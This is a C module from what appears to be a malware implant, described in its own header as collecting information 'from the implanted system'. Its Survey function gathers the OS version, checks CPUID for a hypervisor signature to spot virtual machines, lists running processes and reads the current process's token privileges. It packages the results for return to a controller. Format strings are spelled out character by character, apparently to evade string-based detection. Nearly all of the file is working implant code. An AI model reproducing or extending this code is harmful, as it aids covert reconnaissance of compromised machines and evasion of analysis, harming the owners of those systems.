/*
    PIC module for retrieving relevant information (OS version, processes, process privileges) from the implanted system.
*/

#pragma once

#include <stdint.h>
#include <stdbool.h>
#include "Config.h"

//extern bool CheckHypervisorPort(void);

#define ALLOC_SIZE_LIMIT 0x100000
#define ALLOC_SIZE_DEFAULT 0x800

/*
* @brief Writes the output of a format string to heap memory. Allocates heap memory if none given,
* reallocates the heap if the output exceeds the given size
* @param Config, network context and dynamic imports
* @param data, pointer to an existing heap allocation
* @param[in, out] DataIndex, index of current end of data within heap, index of end of data after print
* @param[in, out] DataSize, size of existing heap allocation, size of new heap allocation
* @param[in] format, format string for printing
* @param VAR_ARGS, format string members (variable amount)
* @return pointer to start of heap allocation where data was written to, (must be freed with HeapFree after use)
*/
uint8_t* printfToHeap(PCONFIG Config, uint8_t* data, unsigned* DataIndex, unsigned* DataSize, const char* format, ...)
{
    // if no heap section allocated, do it now
    if (!data)
    {
        data = Config->Imports->HeapAlloc(Config->Imports->GetProcessHeap(), HEAP_ZERO_MEMORY, *(DataSize));
        if (!data)
        {
            return NULL;
        }
    }
    va_list args;
    va_start(args, format);
    // attempt to write some bytes to the heap buffer
    int bytesWritten = Config->Imports->vsnprintf((char* const)(data + *(DataIndex)), *(DataSize) - *(DataIndex), format, args);
    // when heap buffer write fails, realloc with a larger size buffer
    while (bytesWritten < 0)
    {
        *(DataSize) *= 2;
        if (*(DataSize) > ALLOC_SIZE_LIMIT)
        {
            return NULL;
        }
        uint8_t* newData = Config->Imports->HeapReAlloc(Config->Imports->GetProcessHeap(), HEAP_ZERO_MEMORY, data, *(DataSize));
        if (!newData)
        {
            return NULL;
        }
        data = newData;
        bytesWritten = Config->Imports->vsnprintf((char* const)(data + *(DataIndex)), *(DataSize)-*(DataIndex), format, args);
    }
    va_end(args);
    *(DataIndex) += bytesWritten;
    return data;
}


#define REG_EAX 0
#define REG_EBX 1
#define REG_ECX 2
#define REG_EDX 3
#define REG_BYTES 4
#define MANUF_ID_LEAF 0x00
#define FEATURE_BITS_LEAF 0x01
#define HV_BITMASK 0x00000001
#define HV_ID_LEAF 0x40000000
/*
* @brief Queries the CPUID instruction requesting feature information and parses out the Hypervisor bit.
* @return bool the hypervisor bit, On = True | Off = False
*/
bool isCPUIDHypervisorBitSet() {
    uint32_t regs[4];
    SecureZeroMemory(regs, sizeof(regs));
    //__cpuid(regs, MANUF_ID_LEAF);
    //printf("Highest Function Parameter: 0x%X\n", regs[EAX]);
    //printf("Manufacturer ID: ");
    //printf("%.4s%.4s%.4s\n", (char*) & regs[EBX], (char*) &regs[EDX], (char*) &regs[ECX]);
    // ### query CPUID instruction for Hypervisor presence
    __cpuid((int *)regs, FEATURE_BITS_LEAF);
    bool isHypervisor = regs[REG_ECX] & HV_BITMASK;
    return isHypervisor;
}


/*
* @brief Queries the CPUID instruction requesting Hypervisor ID information and parses the returned values into a string.
* @param Config, network context and dynamic imports
* @param Signature [out] pointer to a character buffer to hold the parsed signature
* @param sigLen [in] the size of the provided Signature buffer
* @return char * pointer to the parsed signature (same as Signature param)
*/
char * CPUIDHypervisorSignature(PCONFIG Config, char * Signature, unsigned sigLen)
{
    uint32_t regs[4];
    SecureZeroMemory(regs, sizeof(regs));
    SecureZeroMemory(Signature, sigLen);
    // ### query CPUID instruction for Hypervisor vendor signature
	__cpuid((int *)regs, HV_ID_LEAF);
	DBGPRINT(Config->Imports->DbgPrint, "%.4s%.4s%.4s\n", (char*)&regs[REG_EBX], (char*)&regs[REG_ECX], (char*)&regs[REG_EDX]);
    // copy register values into char buffer to use as a string
    Config->Imports->memcpy_s(Signature, sigLen, &regs[REG_EBX], REG_BYTES);
    Config->Imports->memcpy_s(Signature + REG_BYTES, sigLen, &regs[REG_ECX], REG_BYTES);
    Config->Imports->memcpy_s(Signature + (2 * REG_BYTES), sigLen, &regs[REG_EDX], REG_BYTES);
	DBGPRINT(Config->Imports->DbgPrint, "CPUID, Hypervisor ID: %s", Signature);
    return Signature;
}


/*
* @brief Interprets a message as a Survey, get system information, command
* and calls necessary Windows APIs to read current OS version, process list, etc.
* @param Config network context and dynamic imports
* @param Message Pointer to message containing GetFile command data
* @param[out] MsgDataLen, Address of unsigned to output number of data bytes read
* @param[out] MsgData, Address of uint8_t pointer to output resulting data buffer (must be freed with HeapFree after use)
* @return status of survey operations, false = failure
*/
bool Survey(PCONFIG Config, PMESSAGE Message, unsigned * MsgDataLen, uint8_t ** MsgData)
{
    (void)Message;
    // just to shorten calls to imported functions
    PIMPORTS imp = Config->Imports;

    bool status = false;
    unsigned dataSize = ALLOC_SIZE_DEFAULT;
    unsigned dataIndex = 0;
    uint8_t* data = NULL;

    // ----- Get OS Version Information -----
    RTL_OSVERSIONINFOW osInfo;
    SecureZeroMemory(&osInfo, sizeof(osInfo)); // Must be used to avoid compiler generating a call to memset
    osInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    if (!NT_SUCCESS(imp->RtlGetVersion(&osInfo)))
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Get OS Information failed.\n");
    }
    // print OS info to the buffer, increment string pointer
    //const char osInfoFmt[] = "\n<| OS Information |>\nVersion: %lu.%lu\nBuild: %lu\nService Pack: %.128ls\n";
    uint8_t osInfoFmt[] = {'\n', '<', '|', ' ', 'O', 'S', ' ', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', ' ', '|', '>', '\n', 'V', 'e', 'r', 's', 'i', 'o', 'n', ':', ' ', '%', 'l', 'u', '.', '%', 'l', 'u', '\n', 'B', 'u', 'i', 'l', 'd', ':', ' ', '%', 'l', 'u', '\n', 'S', 'e', 'r', 'v', 'i', 'c', 'e', ' ', 'P', 'a', 'c', 'k', ':', ' ', '%', '.', '1', '2', '8', 'l', 's', '\n', '\0' };
    data = printfToHeap(Config, data, &dataIndex, &dataSize, (const char *)osInfoFmt, \
        osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber, osInfo.szCSDVersion);
    if (!data)
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Print to Heap Failed.\n");
        goto cleanup;
    }

    // Check for Virtualization
    if (isCPUIDHypervisorBitSet())
    {
        char signature[REG_BYTES * 4];
        CPUIDHypervisorSignature(Config, signature, sizeof(signature));
        uint8_t vmInfoFmt[] = { 'V', 'I', 'R', 'T', 'U', 'A', 'L', 'I', 'Z', 'A', 'T', 'I', 'O', 'N', ' ', 'D', 'E', 'T', 'E', 'C', 'T', 'E', 'D', '\n', 'H', 'y', 'p', 'e', 'r', 'v', 'i', 's', 'o', 'r', ' ', 'S', 'i', 'g', 'n', 'a', 't', 'u', 'r', 'e', ':', ' ', '%', 's', '\n', '\0' };
        data = printfToHeap(Config, data, &dataIndex, &dataSize, (const char*)vmInfoFmt, signature);
    }

    // ----- Get Process List Information -----
    // const char procHeaderFmt[] = "\n<| Running Processes |>\n  PID | Exe Name\n";
    uint8_t procHeaderFmt[] = { '\n', '<', '|', ' ', 'R', 'u', 'n', 'n', 'i', 'n', 'g', ' ', 'P', 'r', 'o', 'c', 'e', 's', 's', 'e', 's', ' ', '|', '>', '\n', ' ', ' ', 'P', 'I', 'D', ' ', '|', ' ', 'E', 'x', 'e', ' ', 'N', 'a', 'm', 'e', '\n', '\0' };
    data = printfToHeap(Config, data, &dataIndex, &dataSize, (const char *) procHeaderFmt);
    if (!data)
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Print to Heap Failed.\n");
        goto cleanup;
    }
    // create a snapshot of the current process list for iteration
    HANDLE processList = imp->CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processList == INVALID_HANDLE_VALUE)
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Process Snapshot Failed.\n");
        goto cleanup;
    }

    // retrieve and print to heap first process info from the process list
    PROCESSENTRY32 procEntry;
    SecureZeroMemory(&procEntry, sizeof(procEntry)); // Must be used to avoid compiler generating a call to memset
    procEntry.dwSize = sizeof(PROCESSENTRY32);
    bool retval = imp->Process32First(processList, &procEntry);
    if (!retval)
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Retrieving First Process Info Failed.\n");
        imp->CloseHandle(processList);
        goto cleanup;
    }
    //const char procInfoFmt[] = "%5lu | %.*s\n";
    uint8_t procInfoFmt[] = { '%', '5', 'l', 'u', ' ', '|', ' ', '%', '.', '*', 's', '\n', '\0' };
    data = printfToHeap(Config, data, &dataIndex, &dataSize, (const char *)procInfoFmt, \
        procEntry.th32ProcessID, MAX_PATH, procEntry.szExeFile);
    if (!data)
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Print to Heap Failed.\n");
        imp->CloseHandle(processList);
        goto cleanup;
    }
    // retrieve and print to heap next process info from the process list until error or end of list
    while (retval)
    {
        retval = imp->Process32Next(processList, &procEntry);
        if (!retval)
        {
            DBGPRINT(imp->DbgPrint, "(Survey) Reached end of Process List, or retrieving Next Process Failed.\n");
            break;
        }
        data = printfToHeap(Config, data, &dataIndex, &dataSize, (const char *)procInfoFmt, \
            procEntry.th32ProcessID, MAX_PATH, procEntry.szExeFile);
        if (!data)
        {
            DBGPRINT(imp->DbgPrint, "(Survey) Print to Heap Failed.\n");
            imp->CloseHandle(processList);
            goto cleanup;
        }
    }
    imp->CloseHandle(processList);

    // ----- Get Current Process Information -----
    unsigned procID = imp->GetCurrentProcessId();
    char procExeName[MAX_PATH];
    if (!imp->GetModuleFileNameA(NULL, procExeName, MAX_PATH))
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Get Executable Name of Current Process Failed.\n");
    }
    //const char currProcInfoFmt[] = "\n<| Current Process Information |>\n%5lu | %.*s\nAccess Privileges:\n";
    uint8_t currProcInfoFmt[] = { '\n', '<', '|', ' ', 'C', 'u', 'r', 'r', 'e', 'n', 't', ' ', 'P', 'r', 'o', 'c', 'e', 's', 's', ' ', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', ' ', '|', '>', '\n', '%', '5', 'l', 'u', ' ', '|', ' ', '%', '.', '*', 's', '\n', 'A', 'c', 'c', 'e', 's', 's', ' ', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', 's', ':', '\n', '\0' };
    data = printfToHeap(Config, data, &dataIndex, &dataSize, (const char *)currProcInfoFmt, \
        procID, MAX_PATH, procExeName);
    if (!data)
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Print to Heap Failed.\n");
        goto cleanup;
    }

    // open the current process token to query privileges
    HANDLE hToken = NULL;
    if (!imp->OpenProcessToken(imp->GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Opening Current Process Token Failed.\n");
        goto cleanup;

    }

    // retrieve token privileges to a heap alloc'ed struct
    unsigned long tokenInfoLen = 0;
    imp->GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLen);
    PTOKEN_PRIVILEGES pPrivileges = (PTOKEN_PRIVILEGES)imp->HeapAlloc(imp->GetProcessHeap(), 0, tokenInfoLen);
    if (!imp->GetTokenInformation(hToken, TokenPrivileges, pPrivileges, tokenInfoLen, &tokenInfoLen))
    {
        DBGPRINT(imp->DbgPrint, "(Survey) Get Token Information Failed.\n");
        goto cleanup;
    }

    // retrieve privilege data and print for all privileges in struct
    for (unsigned idx = 0; idx < pPrivileges->PrivilegeCount; idx++)
    {
        LUID_AND_ATTRIBUTES luidAtts = pPrivileges->Privileges[idx];
        char name[MAX_PATH];
        unsigned long nameLen = sizeof(name);
        if (!imp->LookupPrivilegeNameA(NULL, &(luidAtts.Luid), name, &nameLen))
        {
            DBGPRINT(imp->DbgPrint, "(Survey) Privilege Name Lookup Failed.\n");
            goto cleanup;
        }
        uint8_t tokenInfoFmt1[] = { '%', 's', '\n', '\0' };
        //const char tokenInfoFmt[] = "%s (Not Enabled)\n";
        uint8_t tokenInfoFmt2[] = { '%', 's', ' ', '(', 'N', 'o', 't', ' ', 'E', 'n', 'a', 'b', 'l', 'e', 'd', ')', '\n', '\0' };
        const char* tokenInfoFmt = (const char *) tokenInfoFmt2;
        if (luidAtts.Attributes & SE_PRIVILEGE_ENABLED)
        {
            tokenInfoFmt = (const char *) tokenInfoFmt1;
        }
        data = printfToHeap(Config, data, &dataIndex, &dataSize, tokenInfoFmt, \
            name);
        if (!data)
        {
            DBGPRINT(imp->DbgPrint, "(Survey) Print to Heap Failed.\n");
            goto cleanup;
        }
    }

    // set output paramaters
    *MsgDataLen = dataIndex;
    *MsgData = data;
    status = true;

    return status;

    cleanup:
    if (data)
    {
        imp->HeapFree((HANDLE) imp->GetProcessHeap(), 0, data);
    }
    return status;
}
